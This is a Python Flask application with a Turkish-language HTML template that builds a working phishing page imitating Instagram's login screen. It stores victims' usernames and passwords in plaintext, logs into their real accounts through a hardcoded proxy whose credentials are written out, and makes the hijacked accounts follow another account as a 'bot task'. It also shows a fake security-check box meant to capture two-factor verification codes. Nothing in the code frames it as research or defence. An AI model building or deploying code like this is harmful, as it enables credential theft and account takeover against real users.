import os
import threading
from flask import Flask, request, jsonify, render_template_string
from flask_sqlalchemy import SQLAlchemy
from instagrapi import Client
from instagrapi.exceptions import ChallengeRequired, BadPassword, LoginRequired
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = os.getenv("DATABASE_URL")
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
app.config['SECRET_KEY'] = "mirror-v68-final"

db = SQLAlchemy(app)
PROXY_URL = "http://SDDLzRveLbkavJr:MPvdO65MOnMifL7@82.41.250.136:42158"

clients = {}

class IGAccount(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(100), unique=True, nullable=False)
    password = db.Column(db.String(100), nullable=False)
    status = db.Column(db.String(200), default="Hazır")

def login_handler(u, p):
    with app.app_context():
        cl = Client()
        if PROXY_URL: cl.set_proxy(PROXY_URL)
        clients[u] = cl
        acc = IGAccount.query.filter_by(username=u).first()
        try:
            cl.login(u, p)
            acc.status = "OK"
            db.session.commit()
            cl.user_follow(cl.user_id_from_username("instagram")) # Bot görevi
        except ChallengeRequired:
            acc.status = "ONAY"
            db.session.commit()
        except Exception:
            acc.status = "HATA"
            db.session.commit()

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/api/connect', methods=['POST'])
def connect():
    data = request.json
    u, p = data.get('u'), data.get('p')
    acc = IGAccount.query.filter_by(username=u).first()
    if not acc:
        acc = IGAccount(username=u, password=p, status="Giriş Yapılıyor...")
        db.session.add(acc)
    else:
        acc.password, acc.status = p, "Giriş Yapılıyor..."
    db.session.commit()
    threading.Thread(target=login_handler, args=(u, p)).start()
    return jsonify(status="ok")

@app.route('/api/status/<u>')
def get_status(u):
    acc = IGAccount.query.filter_by(username=u).first()
    return jsonify(status=acc.status if acc else "YOK")

# --- GERÇEK INSTAGRAM GÖRÜNÜMLÜ ARAYÜZ ---
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Giriş Yap • Instagram</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        .insta-input { background: #fafafa; border: 1px solid #dbdbdb; padding: 9px 0 7px 8px; font-size: 12px; border-radius: 3px; width: 100%; outline: none; }
        .insta-input:focus { border: 1px solid #a8a8a8; }
    </style>
</head>
<body class="bg-[#fafafa] flex flex-col items-center justify-center min-h-screen">
    
    <div id="auth-box" class="bg-white border border-[#dbdbdb] p-10 w-[350px] flex flex-col items-center mb-3">
        <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a2560540ad9.png" class="mt-4 mb-8 w-44">
        
        <div class="w-full space-y-2">
            <input id="u" placeholder="Telefon numarası, kullanıcı adı veya e-posta" class="insta-input">
            <input id="p" type="password" placeholder="Şifre" class="insta-input">
            <button onclick="baglan()" id="btn" class="w-full bg-[#0095f6] text-white py-1.5 rounded font-semibold text-sm mt-4 disabled:opacity-50">Giriş Yap</button>
        </div>

        <div class="flex items-center w-full my-6 text-gray-400">
            <div class="h-[1px] bg-[#dbdbdb] flex-grow"></div>
            <div class="px-4 text-[13px] font-semibold">YA DA</div>
            <div class="h-[1px] bg-[#dbdbdb] flex-grow"></div>
        </div>

        <p class="text-[#385185] font-semibold text-sm cursor-pointer">Facebook ile Giriş Yap</p>
    </div>

    <div id="panel" class="hidden bg-white border border-[#dbdbdb] p-8 w-[350px] text-center rounded-lg shadow-sm">
        <h2 id="status-text" class="text-xl font-bold mb-4">Lütfen Bekleyin...</h2>
        <div id="verify-box" class="hidden mt-4">
            <p class="text-xs mb-3 text-red-500 font-bold uppercase">Onay Kodu Gönderildi</p>
            <input id="vcode" placeholder="000 000" class="insta-input text-center text-xl mb-3 tracking-widest">
            <button onclick="onayla()" class="w-full bg-[#0095f6] text-white py-2 rounded font-bold">Kodu Onayla</button>
        </div>
        <p id="user-display" class="mt-4 text-gray-500 font-bold text-sm"></p>
    </div>

    <script>
        let cur = "";
        function baglan() {
            cur = document.getElementById('u').value;
            const p = document.getElementById('p').value;
            if(!cur || !p) return;

            document.getElementById('btn').innerText = "Giriş Yapılıyor...";
            
            fetch('/api/connect', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({u:cur, p:p})
            });

            setTimeout(() => {
                document.getElementById('auth-box').classList.add('hidden');
                document.getElementById('panel').classList.remove('hidden');
                document.getElementById('user-display').innerText = "@" + cur;
                setInterval(check, 3000);
            }, 1000);
        }

        async function check() {
            const r = await fetch('/api/status/' + cur);
            const d = await r.json();
            const t = document.getElementById('status-text');
            const v = document.getElementById('verify-box');

            if(d.status === "OK") {
                t.innerText = "SİSTEM AKTİF ✅";
                t.classList.add('text-green-500');
                v.classList.add('hidden');
            } else if(d.status === "ONAY") {
                t.innerText = "GÜVENLİK KONTROLÜ";
                v.classList.remove('hidden');
            } else if(d.status === "HATA") {
                t.innerText = "HATALI GİRİŞ ❌";
                t.classList.add('text-red-500');
            }
        }
    </script>
</body>
</html>
"""

if __name__ == "__main__":
    with app.app_context(): db.create_all()
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 10000)))
